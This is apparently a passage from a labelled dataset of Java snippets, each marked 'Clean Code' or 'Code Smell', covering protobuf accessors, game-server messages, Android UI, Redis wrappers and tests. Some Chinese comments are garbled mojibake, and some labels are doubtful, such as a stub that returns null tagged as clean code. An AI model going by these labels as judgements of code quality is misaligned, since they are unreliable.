  if ((bitField0_ & 0x00000010) != 0) {
    size+=(1 * archiveUnlockList.length()) + ProtoSink.computeRepeatedUInt32SizeNoTag(archiveUnlockList);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    size+=(1 * takenRewardList.length()) + ProtoSink.computeRepeatedUInt32SizeNoTag(takenRewardList);
  }
  return size;
}",0,Clean Code
"@Test public void test() throws Exception {
  String[] tests=new String[]{""AND"",""OR""};
  for (  String test : tests) {
    BooleanOp name=new BooleanOp(getInputStream(test));
    String nameVal=name.getOperator();
    assertNotNull(nameVal);
    assertEquals(test,nameVal);
  }
}
",0,Clean Code
"private RegressorProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private RegressorProto(){
  name_=com.google.protobuf.LazyStringArrayList.EMPTY;
  value_=emptyDoubleList();
  variance_=emptyDoubleList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@55bf4a3f",0,Clean Code
"/** 
 * An optimized implementation which avoids constantly unpacking and repacking integer coordinates.
 * @reason Use faster implementation
 * @author JellySquid
 */
@Overwrite public int getLight(long pos){
  int posX=BlockPos.unpackLongX(pos);
  int posYOrig=BlockPos.unpackLongY(pos);
  int posZ=BlockPos.unpackLongZ(pos);
  int chunkX=ChunkSectionPos.getSectionCoord(posX);
  int chunkYOrig=ChunkSectionPos.getSectionCoord(posYOrig);
  int chunkZ=ChunkSectionPos.getSectionCoord(posZ);
  long chunkOrig=ChunkSectionPos.asLong(chunkX,chunkYOrig,chunkZ);
  StampedLock lock=this.uncachedLightArraysLock;
  long stamp;
  ChunkNibbleArray array;
  optimisticRead:   while (true) {
    stamp=lock.tryOptimisticRead();
    int posY=posYOrig;
    int chunkY=chunkYOrig;
    long chunk=chunkOrig;
    ChunkToNibbleArrayMap<?> data=this.uncachedStorage;
    SkyLightStorageDataAccess sdata=(SkyLightStorageDataAccess)data;
    int height=sdata.getHeight(ChunkSectionPos.withZeroY(chunk));
    if (height == sdata.getDefaultHeight() || chunkY >= height) {
      if (lock.validate(stamp)) {
        return 15;
      }
 else {
        continue;
      }
    }
    array=data.get(chunk);
    while (array == null) {
      ++chunkY;
      if (chunkY >= height) {
        if (lock.validate(stamp)) {
          return 15;
        }
 else {
          continue optimisticRead;
        }
      }
      chunk=ChunkSectionPosHelper.updateYLong(chunk,chunkY);
      array=data.get(chunk);
      posY=chunkY << 4;
    }
    if (lock.validate(stamp)) {
      return array.get(ChunkSectionPos.getLocalCoord(posX),ChunkSectionPos.getLocalCoord(posY),ChunkSectionPos.getLocalCoord(posZ));
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 entry_id = 2;</code>
 * @return whether the entryId field is set
 */
public boolean hasEntryId(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"void onPushCanceledSpeak(GProAVUserStateChangeInfo gProAVUserStateChangeInfo);
",0,Clean Code
"@Specialization @TruffleBoundary protected boolean eval(VmMapping self){
  for (VmObjectLike curr=self; curr != null; curr=curr.getParent()) {
    var cursor=EconomicMaps.getEntries(curr.getMembers());
    while (cursor.advance()) {
      if (!(cursor.getKey() instanceof Identifier))       return false;
    }
  }
  return true;
}
@Specialization @TruffleBoundary protected long eval(VmMapping self){
  MutableLong count=new MutableLong(0);
  self.iterateMemberValues((key,member,value) -> {
    count.getAndIncrement();
    return true;
  }
);
  return count.get();
}
@Specialization protected VmSet eval(VmMapping self){
  return self.getAllKeys();
}
@Specialization protected boolean eval(VmMapping self,Object key){
  if (self.hasCachedValue(key))   return true;
  for (VmObjectLike curr=self; curr != null; curr=curr.getParent()) {
    if (curr.hasMember(key))     return true;
  }
  return false;
}
@Specialization protected Object eval(VmMapping self,Object key){
  return VmNull.lift(VmUtils.readMemberOrNull(self,key,callNode));
}
@Specialization protected Object eval(VmMapping self,Object initial,VmFunction function){
  var result=new MutableReference<>(initial);
  self.forceAndIterateMemberValues((key,def,value) -> {
    result.set(applyLambdaNode.execute(function,result.get(),key,value));
    return true;
  }
);
  return result.get();
}
@Specialization protected VmMap eval(VmMapping self){
  var builder=VmMap.builder();
  self.forceAndIterateMemberValues((key,def,value) -> {
    builder.add(key,value);
    return true;
  }
);
  return builder.build();
}",1,Code Smell
"/** 
 * connection
 * @return
 */
String getUrl();
",0,Clean Code
"public void setTestWhileIdle(boolean testWhileIdle){
  this.testWhileIdle=testWhileIdle;
}
",0,Clean Code
"private Object writeReplace(){
  return ref;
}
",0,Clean Code
"protected void onUserNickUpdate(String str,String str2){
}",0,Clean Code
"@Override public int getPlatform(){
  return this.mInfo.getPlatform();
}
",0,Clean Code
"private TensorFlowSequenceModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private TensorFlowSequenceModelProto(){
  modelDef_=com.google.protobuf.ByteString.EMPTY;
  predictOp_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@34c6b11a",0,Clean Code
"public List<String> getCmdWhiteList(){
  return null;
}
",0,Clean Code
"public int getScreenShareMicStatus(){
  return this.screenShareMicStatus;
}
",0,Clean Code
"@Override public HandleFriendCsReq create(){
  return HandleFriendCsReq.newInstance();
}
",0,Clean Code
"long getTinyId();
",0,Clean Code
"@Override public void readFully(byte[] data) throws IOException {
  buffer.readBytes(data);
}
@Override public void readFully(byte[] data,int offset,int size) throws IOException {
  buffer.readBytes(data,offset,size);
}
",0,Clean Code
"public void setHintText(CharSequence text){
  setHintText(text,false);
}
public void setHintText(CharSequence text,boolean animated){
  if (text == null) {
    text="""";
  }
  if (getMeasuredWidth() == 0) {
    animated=false;
  }
  if (animated) {
    if (hintAnimator == null) {
      hintAnimator=new SubstringLayoutAnimator(this);
    }
    hintAnimator.create(hintLayout,hint,text,getPaint());
  }
 else {
    if (hintAnimator != null) {
      hintAnimator.cancel();
    }
  }
  hint=text;
  if (getMeasuredWidth() != 0) {
    text=TextUtils.ellipsize(text,getPaint(),getMeasuredWidth(),TextUtils.TruncateAt.END);
    if (hintLayout != null && TextUtils.equals(hintLayout.getText(),text)) {
      return;
    }
  }
  hintLayout=new StaticLayout(text,getPaint(),AndroidUtilities.dp(1000),Layout.Alignment.ALIGN_NORMAL,1.0f,0.0f,false);
}",0,Clean Code
"/** 
 * <code>optional bool show_display_avatars = 14;</code>
 * @return whether the showDisplayAvatars field is set
 */
public boolean hasShowDisplayAvatars(){
  return (bitField0_ & 0x00000020) != 0;
}",0,Clean Code
"@Test public void testGetFunctionInputType(){
  Class<?> inputType=TypeResolverHelper.getFunctionInputClass(MockWeatherService.class);
  assertThat(inputType).isEqualTo(Request.class);
}
",0,Clean Code
"/** 
 * <code>optional uint32 sender_uid = 9;</code>
 * @return the senderUid
 */
public int getSenderUid(){
  return senderUid;
}",0,Clean Code
"/** 
 * <code>optional uint32 GBNLDJIPEEK = 1;</code>
 * @return this
 */
public PlayerRecordInfo clearGBNLDJIPEEK(){
  bitField0_&=~0x00000001;
  gBNLDJIPEEK=0;
  return this;
}",0,Clean Code
"/** 
 * @return a converter that maps between this enum's numeric and text representations
 */
public static ProtoEnum.EnumConverter<BattleEndReason> converter(){
  return BattleEndReasonConverter.INSTANCE;
}
",0,Clean Code
"public ZyLineContent(final String text,final Font font,final IZyEditableObject model){
  this(text,font,new ArrayList<CStyleRunData>(),model);
}
public ZyLineContent(final String text,final Font font,final List<CStyleRunData> textColorStyleRun,final IZyEditableObject model){
  Preconditions.checkNotNull(text,""Error: Text argument can't be null"");
  Preconditions.checkNotNull(textColorStyleRun,""Error: Text color style run can't be null."");
  m_model=model;
  regenerateLine(text,font,textColorStyleRun);
}
public ZyLineContent(final String text,final IZyEditableObject model){
  this(text,null,model);
}
",0,Clean Code
"private List<WorkflowDef> getAllWorkflowDefVersions(String name){
  try {
    ResultSet resultSet=session.execute(selectAllWorkflowDefVersionsByNameStatement.bind(name));
    recordCassandraDaoRequests(""getAllWorkflowDefVersions"",""n/a"",name);
    List<Row> rows=resultSet.all();
    if (rows.size() == 0) {
      LOGGER.info(""Not workflow definitions were found for : {}"",name);
      return null;
    }
    return rows.stream().map(row -> readValue(row.getString(WORKFLOW_DEFINITION_KEY),WorkflowDef.class)).collect(Collectors.toList());
  }
 catch (  DriverException e) {
    Monitors.error(CLASS_NAME,""getAllWorkflowDefVersions"");
    String errorMsg=String.format(""Failed to get workflows defs for : %s"",name);
    LOGGER.error(errorMsg,e);
    throw new TransientException(errorMsg,e);
  }
}",0,Clean Code
"public void setLocalId(int i2){
  this.localId=i2;
}",0,Clean Code
"/** 
 * <code>optional uint32 question_difficulty = 10;</code>
 * @return this
 */
public ChessRogueNousDiceInfo clearQuestionDifficulty(){
  bitField0_&=~0x00000002;
  questionDifficulty=0;
  return this;
}",0,Clean Code
"public SingleViewNode(final IAddress addr,final int id,final double x,final double y,final Color color,final Color borderColor,final boolean selected,final boolean visible){
  super(id,x,y,0,0,color,borderColor,selected,visible);
  checkNotNull(addr);
  address=addr;
}",0,Clean Code
"public static void main(String[] args){
  OpenCV.loadShared();
  Date lastYasuoDate=DateUtil.parse(""2022骞�05鏈�12鏃�"");
  List<File> files=FileUtil.loopFiles(docPath);
  for (  File file : files) {
    if (FileUtil.lastModifiedTime(file).before(lastYasuoDate)) {
      System.out.println(""宸插帇缂╄繃"");
      continue;
    }
    if (!FileNameUtil.isType(file.getName(),""jpg"",""png"",""jpeg"")) {
      System.out.println(file.getAbsolutePath());
      continue;
    }
    if (FileUtil.size(file) < 50 * 1000) {
      continue;
    }
    Mat sourceImage=Imgcodecs.imread(file.getAbsolutePath());
    String extName=FileUtil.extName(file);
    MatOfInt dstImageParam=null;
    if (""png"".equals(extName)) {
      dstImageParam=new MatOfInt(Imgcodecs.IMWRITE_PNG_COMPRESSION,9);
    }
 else     if (""jpg"".equals(extName) || ""jpeg"".equals(extName)) {
      dstImageParam=new MatOfInt(Imgcodecs.IMWRITE_JPEG_QUALITY,50);
    }
    if (dstImageParam != null) {
      Imgcodecs.imwrite(file.getAbsolutePath(),sourceImage,dstImageParam);
    }
  }
}",0,Clean Code
"Judge0JavaScriptEngine(String apiKey,int languageId,Duration timeout){
  this.apiKey=apiKey;
  this.languageId=languageId;
  this.client=new OkHttpClient.Builder().connectTimeout(timeout).readTimeout(timeout).writeTimeout(timeout).callTimeout(timeout).build();
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj) {
    return true;
  }
  if (obj == null) {
    return false;
  }
  if (getClass() != obj.getClass()) {
    return false;
  }
  Partition other=(Partition)obj;
  if (broker == null) {
    if (other.broker != null) {
      return false;
    }
  }
 else   if (broker.getBrokerId() != other.broker.getBrokerId()) {
    return false;
  }
 else   if (!broker.getHost().equals(other.broker.getHost())) {
    return false;
  }
  if (partitionId != other.partitionId) {
    return false;
  }
  if (topic == null) {
    if (other.topic != null) {
      return false;
    }
  }
 else   if (!topic.equals(other.topic)) {
    return false;
  }
  return true;
}
",0,Clean Code
"private void save(boolean force){
  if (selectedIds.size() == 0 && !force) {
    return;
  }
switch (type) {
case TYPE_CHANNEL:
    List<TLRPC.Chat> selectedChats=new ArrayList<>();
  for (  TLObject object : allSelectedObjects.values()) {
    if (object instanceof TLRPC.Chat && selectedIds.contains(-((TLRPC.Chat)object).id)) {
      selectedChats.add((TLRPC.Chat)object);
    }
  }
if (selectedObjectsListener != null) {
  selectedObjectsListener.onChatsSelected(selectedChats,true);
}
break;
case TYPE_USER:
List<TLRPC.User> selectedUsers=new ArrayList<>();
for (TLObject object : allSelectedObjects.values()) {
if (object instanceof TLRPC.User && selectedIds.contains(((TLRPC.User)object).id)) {
selectedUsers.add((TLRPC.User)object);
}
}
if (selectedObjectsListener != null) {
selectedObjectsListener.onUsersSelected(selectedUsers);
}
break;
case TYPE_COUNTRY:
List<TLRPC.TL_help_country> selectedCountries=new ArrayList<>();
for (TLRPC.TL_help_country country : countriesList) {
long id=country.default_name.hashCode();
if (selectedIds.contains(id)) {
selectedCountries.add(country);
}
}
if (selectedObjectsListener != null) {
selectedObjectsListener.onCountrySelected(selectedCountries);
}
break;
}
}",0,Clean Code
"public String getRoleName(){
  return this.roleName;
}
",0,Clean Code
"/** 
 * Get a DocumentFile corresponding to the given file (for writing on ExtSdCard on Android 5). If the file is not existing, it is created.
 * @param file        The file.
 * @param isDirectory flag indicating if the file should be a directory.
 * @return The DocumentFile
 */
@TargetApi(Build.VERSION_CODES.LOLLIPOP) public static DocumentFile getDocumentFile(final File file,final boolean isDirectory,Context context){
  String baseFolder=getExtSdCardFolder(file,context);
  boolean originalDirectory=false;
  if (baseFolder == null) {
    return null;
  }
  String relativePath=null;
  try {
    String fullPath=file.getCanonicalPath();
    if (!baseFolder.equals(fullPath))     relativePath=fullPath.substring(baseFolder.length() + 1);
 else     originalDirectory=true;
  }
 catch (  IOException e) {
    return null;
  }
catch (  Exception f) {
    originalDirectory=true;
  }
  String as=FTPConfig.DEF_PATH.getAbsolutePath();
  Uri treeUri=null;
  if (as != null)   treeUri=Uri.parse(as);
  if (treeUri == null) {
    return null;
  }
  if (file.exists()) {
    Uri documentUri=DocumentsContract.buildDocumentUriUsingTree(treeUri,DocumentsContract.getTreeDocumentId(treeUri) + relativePath);
    DocumentFile document=DocumentFile.fromSingleUri(context,documentUri);
    if (document != null) {
      return document;
    }
  }
  DocumentFile document=DocumentFile.fromTreeUri(context,treeUri);
  if (originalDirectory)   return document;
  String[] parts=relativePath.split(""\\/"");
  for (int i=0; i < parts.length; i++) {
    DocumentFile nextDocument=document.findFile(parts[i]);
    if (nextDocument == null) {
      if ((i < parts.length - 1) || isDirectory) {
        nextDocument=document.createDirectory(parts[i]);
      }
 else {
        nextDocument=document.createFile(DocumentsContract.Document.COLUMN_MIME_TYPE,parts[i]);
      }
    }
    document=nextDocument;
  }
  return document;
}",0,Clean Code
"public FunctionLiteralNode(SourceSection sourceSection,UnresolvedFunctionNode functionNode,boolean isCustomThisScope){
  super(sourceSection);
  this.unresolvedFunctionNode=functionNode;
  this.isCustomThisScope=isCustomThisScope;
}
",0,Clean Code
"/** 
 * 淇敼鐢ㄦ埛鍙傛暟
 */
@PostMapping(""/upd"") public R<Map<String,String>> upd(@Validated @RequestBody UserParamUpdReq req){
  req.setUserId(AuthContext.getUserId());
  baseService.update(req);
  baseService.refresh();
  return R.ok(baseService.selectMap(AuthContext.getUserId(),true,UserParamEnum.values()));
}
",0,Clean Code
"public static String toUnicodeEscape(int ch){
  var hex=Integer.toHexString(ch);
  return null;
}
",0,Clean Code
"@Test public void testGetTaskInputV2(){
  WorkflowModel workflow=createDefaultWorkflow();
  workflow.getWorkflowDefinition().setSchemaVersion(2);
  Map<String,Object> inputParams=new HashMap<>();
  inputParams.put(""workflowInputParam"",""${workflow.input.requestId}"");
  inputParams.put(""taskOutputParam"",""${task2.output.location}"");
  inputParams.put(""taskOutputParam2"",""${task2.output.locationBad}"");
  inputParams.put(""taskOutputParam3"",""${task3.output.location}"");
  inputParams.put(""constParam"",""Some String value"");
  inputParams.put(""nullValue"",null);
  inputParams.put(""task2Status"",""${task2.status}"");
  inputParams.put(""channelMap"",""${workflow.input.channelMapping}"");
  Map<String,Object> taskInput=parametersUtils.getTaskInput(inputParams,workflow,null,null);
  assertNotNull(taskInput);
  assertTrue(taskInput.containsKey(""workflowInputParam""));
  assertTrue(taskInput.containsKey(""taskOutputParam""));
  assertTrue(taskInput.containsKey(""taskOutputParam2""));
  assertTrue(taskInput.containsKey(""taskOutputParam3""));
  assertNull(taskInput.get(""taskOutputParam2""));
  assertNotNull(taskInput.get(""channelMap""));
  assertEquals(5,taskInput.get(""channelMap""));
  assertEquals(""request id 001"",taskInput.get(""workflowInputParam""));
  assertEquals(""http://location"",taskInput.get(""taskOutputParam""));
  assertNull(taskInput.get(""taskOutputParam3""));
  assertNull(taskInput.get(""nullValue""));
  assertEquals(workflow.getTasks().get(0).getStatus().name(),taskInput.get(""task2Status""));
}",0,Clean Code
"static SearchResultsWrapper search(MilvusServiceClient milvusClient,SearchParam searchRequest){
  R<SearchResults> response=milvusClient.search(searchRequest);
  checkResponseNotFailed(response);
  return new SearchResultsWrapper(response.getData().getResults());
}
",0,Clean Code
"public void loadLayout(String jsonPath) throws IOException, JsonSyntaxException {
  CustomControls layout=LayoutConverter.loadAndConvertIfNecessary(jsonPath);
  if (layout != null) {
    loadLayout(layout);
    updateLoadedFileName(jsonPath);
    return;
  }
  throw new IOException(""Unsupported control layout version"");
}
public void loadLayout(CustomControls controlLayout){
  if (mActionRow == null) {
    mActionRow=new ActionRow(getContext());
    addView(mActionRow);
  }
  removeAllButtons();
  if (mLayout != null) {
    mLayout.mControlDataList=null;
    mLayout=null;
  }
  System.gc();
  mapTable.clear();
  if (controlLayout == null)   return;
  mLayout=controlLayout;
  for (  ControlJoystickData joystick : mLayout.mJoystickDataList) {
    addJoystickView(joystick);
  }
  for (  ControlData button : controlLayout.mControlDataList) {
    addControlView(button);
  }
  for (  ControlDrawerData drawerData : controlLayout.mDrawerDataList) {
    ControlDrawer drawer=addDrawerView(drawerData);
    if (mModifiable)     drawer.areButtonsVisible=true;
  }
  mLayout.scaledAt=LauncherPreferences.PREF_BUTTONSIZE;
  setModified(false);
  mButtons=null;
  getButtonChildren();
}
",0,Clean Code
"@Override public void initPrefs(){
  mForceSystemFonts=findPreference(""prefs_key_system_ui_lock_screen_force_system_fonts"");
  mPasswordFree=findPreference(""prefs_key_system_ui_lock_screen_password_free"");
  mChangingCVTime=findPreference(""prefs_key_system_ui_lock_screen_show_spacing_value"");
  mShowSec=findPreference(""prefs_key_system_ui_lock_screen_show_second"");
  mShowSec.setVisible(!isHyperOSVersion(1f));
  mForceSystemFonts.setVisible(!isHyperOSVersion(1f));
  mChangingCVTime.setVisible(isMoreAndroidVersion(Build.VERSION_CODES.TIRAMISU));
  if (isDeviceEncrypted(requireContext())) {
    mPasswordFree.setChecked(false);
    mPasswordFree.setEnabled(false);
    mPasswordFree.setSummary(R.string.system_ui_lock_screen_password_free_tip);
  }
}",0,Clean Code
"public static String getCountryCode(String name){
  for (  String code : Locale.getISOCountries()) {
    Locale locale=new Locale(""en"",code);
    if (locale.getDisplayCountry(Locale.ENGLISH).equalsIgnoreCase(name)) {
      return code;
    }
  }
  return """";
}
",0,Clean Code
"public Builder(String prompt){
  this.prompt=prompt;
}
public Builder(Role role){
  this.role=role;
}
public Builder(String model){
  Assert.notNull(model,""The model can not be null."");
  this.model=model;
}
",0,Clean Code
"public void registerServletCommand(String str,Servlet servlet){
}
",0,Clean Code
"public void setOnDataChangeListener(OnDataChangeListener listener){
  onDataChangeListener=listener;
}
",0,Clean Code
"public Chat2dbAIEventSourceListener(SseEmitter sseEmitter){
  this.sseEmitter=sseEmitter;
}",0,Clean Code
"/** 
 * <code>optional uint32 round_count = 2;</code>
 * @return this
 */
public ChallengeInfo clearRoundCount(){
  bitField0_&=~0x00000001;
  roundCount=0;
  return this;
}",0,Clean Code
"@Override public Tuple zpopmax(String key){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.zpopmax(key);
  }
 }
@Override public Set<Tuple> zpopmax(String key,int count){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.zpopmax(key,count);
  }
 }
",0,Clean Code
"public ReplServer(SecurityManager securityManager,HttpClient httpClient,Logger logger,Collection<ModuleKeyFactory> moduleKeyFactories,Collection<ResourceReader> resourceReaders,Map<String,String> environmentVariables,Map<String,String> externalProperties,@Nullable Path moduleCacheDir,@Nullable DeclaredDependencies projectDependencies,@Nullable String outputFormat,Path workingDir,StackFrameTransformer frameTransformer){
  this.workingDir=workingDir;
  this.securityManager=securityManager;
  this.moduleResolver=new ModuleResolver(moduleKeyFactories);
  this.errorRenderer=new VmExceptionRenderer(new StackTraceRenderer(frameTransformer));
  replState=new ReplState(createEmptyReplModule(BaseModule.getModuleClass().getPrototype()));
  var languageRef=new MutableReference<VmLanguage>(null);
  packageResolver=PackageResolver.getInstance(securityManager,httpClient,moduleCacheDir);
  projectDependenciesManager=projectDependencies == null ? null : new ProjectDependenciesManager(projectDependencies);
  polyglotContext=VmUtils.createContext(() -> {
    languageRef.set(VmLanguage.get(null));
    var vmContext=VmContext.get(null);
    vmContext.initialize(new VmContext.Holder(frameTransformer,securityManager,httpClient,moduleResolver,new ResourceManager(securityManager,resourceReaders),logger,environmentVariables,externalProperties,moduleCacheDir,outputFormat,packageResolver,projectDependenciesManager));
  }
);
  language=languageRef.get();
}
",0,Clean Code
"/** 
 * 鑾峰彇鎸囧畾鐢ㄦ埛鐨勪笂绾х敤鎴�
 * @param queryBO:鐢ㄦ埛鏌ヨBO
 * @return 鐢ㄦ埛琛�
 */
@PostMapping(""/adminUser/queryParentByLevel"") @ApiExplain(""鑾峰彇鎸囧畾鐢ㄦ埛鐨勪笂绾х敤鎴�"") Result<List<UserInfo>> queryParentByLevel(@RequestBody AdminUserQueryBO queryBO);
",0,Clean Code
"/** 
 * <pre> 鎿嶄綔瀵硅薄 </pre> <code>string operation_obj = 9;</code>
 * @param value The operationObj to set.
 * @return This builder for chaining.
 */
public Builder setOperationObj(String value){
  if (value == null) {
    throw new NullPointerException();
  }
  operationObj_=value;
  onChanged();
  return this;
}",0,Clean Code
"public static String getLanguage(Context context){
  Resources resources=context.getResources();
  String country=resources.getConfiguration().getLocales().get(0).getCountry();
  if (country.isEmpty()) {
    return resources.getConfiguration().getLocales().get(0).getLanguage();
  }
  return resources.getConfiguration().getLocales().get(0).getLanguage() + ""_"" + country;
}",0,Clean Code
"/** 
 * <code>repeated .RogueMiracle.KONAGCDHKKHEntry KONAGCDHKKH = 10;</code>
 * @param value the kONAGCDHKKH to add
 * @return this
 */
public RogueMiracle addKONAGCDHKKH(final KONAGCDHKKHEntry value){
  bitField0_|=0x00000008;
  kONAGCDHKKH.add(value);
  return this;
}",0,Clean Code
"@Override public Long setrange(String key,long offset,String value){
  return executeInJedis(jedis -> jedis.setrange(key,offset,value));
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code RogueCurVirtualItemInfo}
 */
public static RogueCurVirtualItemInfo newInstance(){
  return new RogueCurVirtualItemInfo();
}
",0,Clean Code
"/** 
 * <code>optional .ChessRogueCellInfo cell_info = 13;</code>
 * @return whether the cellInfo field is set
 */
public boolean hasCellInfo(){
  return (bitField0_ & 0x00000008) != 0;
}",0,Clean Code
"/** 
 * 瑙ｆ瀽ZK鍦板潃
 * @see ConnectStringParser
 */
public static List<Tuple<String,Integer>> connectStringParser(String connectString){
  List<Tuple<String,Integer>> ipPortList=new ArrayList<>();
  if (connectString == null) {
    return ipPortList;
  }
  int off=connectString.indexOf('/');
  if (off >= 0) {
    connectString=connectString.substring(0,off);
  }
  List<String> hostsList=split(connectString,"","");
  for (  String host : hostsList) {
    int port=DEFAULT_PORT;
    String[] hostAndPort=NetUtils.getIPV6HostAndPort(host);
    if (hostAndPort.length != 0) {
      host=hostAndPort[0];
      if (hostAndPort.length == 2) {
        port=Integer.parseInt(hostAndPort[1]);
      }
    }
 else {
      int pidx=host.lastIndexOf(':');
      if (pidx >= 0) {
        if (pidx < host.length() - 1) {
          port=Integer.parseInt(host.substring(pidx + 1));
        }
        host=host.substring(0,pidx);
      }
    }
    ipPortList.add(new Tuple<>(host,port));
  }
  return ipPortList;
}",0,Clean Code
"@Override public void removeBend(final int index){
  m_bends.remove(index);
}
",0,Clean Code
"/** 
 * Peeks an Ogg page header and updates this  {@link OggPageHeader}.
 * @param input The {@link ExtractorInput} to read from.
 * @param quiet Whether to return {@code false} rather than throwing an exception if the headercannot be populated.
 * @return Whether the read was successful. The read fails if the end of the input is encounteredwithout reading data.
 * @throws IOException If reading data fails or the stream is invalid.
 * @throws InterruptedException If the thread is interrupted.
 */
public boolean populate(ExtractorInput input,boolean quiet) throws IOException, InterruptedException {
  scratch.reset();
  reset();
  boolean hasEnoughBytes=input.getLength() == C.LENGTH_UNSET || input.getLength() - input.getPeekPosition() >= EMPTY_PAGE_HEADER_SIZE;
  if (!hasEnoughBytes || !input.peekFully(scratch.data,0,EMPTY_PAGE_HEADER_SIZE,true)) {
    if (quiet) {
      return false;
    }
 else {
      throw new EOFException();
    }
  }
  if (scratch.readUnsignedInt() != TYPE_OGGS) {
    if (quiet) {
      return false;
    }
 else {
      throw new ParserException(""expected OggS capture pattern at begin of page"");
    }
  }
  revision=scratch.readUnsignedByte();
  if (revision != 0x00) {
    if (quiet) {
      return false;
    }
 else {
      throw new ParserException(""unsupported bit stream revision"");
    }
  }
  type=scratch.readUnsignedByte();
  granulePosition=scratch.readLittleEndianLong();
  streamSerialNumber=scratch.readLittleEndianUnsignedInt();
  pageSequenceNumber=scratch.readLittleEndianUnsignedInt();
  pageChecksum=scratch.readLittleEndianUnsignedInt();
  pageSegmentCount=scratch.readUnsignedByte();
  headerSize=EMPTY_PAGE_HEADER_SIZE + pageSegmentCount;
  scratch.reset();
  input.peekFully(scratch.data,0,pageSegmentCount);
  for (int i=0; i < pageSegmentCount; i++) {
    laces[i]=scratch.readUnsignedByte();
    bodySize+=laces[i];
  }
  return true;
}",0,Clean Code
"@Override public LockEquipmentCsReq create(){
  return LockEquipmentCsReq.newInstance();
}
",0,Clean Code
"private void visit(DuckDBJoin join){
  visit(join.getLeftTable());
  sb.append("" "");
  sb.append(join.getJoinType());
  sb.append("" "");
  if (join.getOuterType() != null) {
    sb.append(join.getOuterType());
  }
  sb.append("" JOIN "");
  visit(join.getRightTable());
  if (join.getOnCondition() != null) {
    sb.append("" ON "");
    visit(join.getOnCondition());
  }
}
private void visit(DuckDBConstant constant){
  sb.append(constant.toString());
}
private void visit(DuckDBSelect select){
  sb.append(""SELECT "");
  if (select.isDistinct()) {
    sb.append(""DISTINCT "");
  }
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getGroupByExpressions().isEmpty()) {
    sb.append("" GROUP BY "");
    visit(select.getGroupByExpressions());
  }
  if (select.getHavingClause() != null) {
    sb.append("" HAVING "");
    visit(select.getHavingClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}
",0,Clean Code
"public Truncate getTruncate(){
  return this.truncate;
}
",0,Clean Code
"void start(){
  if (config.ignoreCaller(this)) {
    return;
  }
  if (methodGen.getInstructionList() == null) {
    return;
  }
  for (  InstructionHandle ih : methodGen.getInstructionList()) {
    Instruction instruction=ih.getInstruction();
    if (!(instruction instanceof InvokeInstruction)) {
      continue;
    }
    InvokeInstruction invokeInstruction=(InvokeInstruction)instruction;
    String calleeMethod=invokeInstruction.getMethodName(constantPoolGen);
    String calleeClass=invokeInstruction.getClassName(constantPoolGen);
    CallGraphEntry callGraphEntry=new CallGraphEntry(config,callerClass,callerMethod,calleeClass,calleeMethod);
    if (config.ignoreInvokeInstruction(this,invokeInstruction,callGraphEntry)) {
      continue;
    }
    if (invokeInstruction instanceof INVOKEINTERFACE) {
      callGraphEntry.setInvokeInterface(true);
    }
    if (invokeInstruction instanceof INVOKESTATIC) {
      callGraphEntry.setInvokeStatic(true);
    }
    report.register(callGraphEntry);
  }
}
",0,Clean Code
"/** 
 * <code>repeated .SceneGroupState group_state_list = 1768;</code>
 * @param values the groupStateList to add
 * @return this
 */
public SceneInfo addAllGroupStateList(final SceneGroupStateOuterClass.SceneGroupState... values){
  bitField0_|=0x00001000;
  groupStateList.addAll(values);
  return this;
}",0,Clean Code
"/** 
 * <code>optional bool has_taken_rewards = 9;</code>
 * @return this
 */
public RogueArea clearHasTakenRewards(){
  bitField0_&=~0x00000020;
  hasTakenRewards=false;
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 group_id = 4;</code>
 * @return this
 */
public RotaterData clearGroupId(){
  bitField0_&=~0x00000002;
  groupId=0;
  return this;
}",0,Clean Code
"@Override public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception {
  if (handler instanceof HandlerMethod) {
    HandlerMethod handlerMethod=(HandlerMethod)handler;
    Permission permission=handlerMethod.getMethod().getAnnotation(Permission.class);
    if (permission == null) {
      permission=handlerMethod.getBeanType().getAnnotation(Permission.class);
    }
    if (permission == null || permission.role() == UserRole.ALL) {
      if (ReqInfoContext.getReqInfo() != null) {
        SpringUtil.getBean(UserActivityRankService.class).addActivityScore(ReqInfoContext.getReqInfo().getUserId(),new ActivityScoreBo().setPath(ReqInfoContext.getReqInfo().getPath()));
      }
      return true;
    }
    if (ReqInfoContext.getReqInfo() == null || ReqInfoContext.getReqInfo().getUserId() == null) {
      if (handlerMethod.getMethod().getAnnotation(ResponseBody.class) != null || handlerMethod.getMethod().getDeclaringClass().getAnnotation(RestController.class) != null) {
        response.setContentType(MediaType.APPLICATION_JSON_UTF8_VALUE);
        response.getWriter().println(JsonUtil.toStr(ResVo.fail(StatusEnum.FORBID_NOTLOGIN)));
        response.getWriter().flush();
        return false;
      }
 else       if (request.getRequestURI().startsWith(""/api/admin/"") || request.getRequestURI().startsWith(""/admin/"")) {
        response.sendRedirect(""/admin"");
      }
 else {
        response.sendRedirect(""/"");
      }
      return false;
    }
    if (permission.role() == UserRole.ADMIN && !UserRole.ADMIN.name().equalsIgnoreCase(ReqInfoContext.getReqInfo().getUser().getRole())) {
      response.setStatus(HttpStatus.FORBIDDEN.value());
      return false;
    }
  }
  return true;
}",0,Clean Code
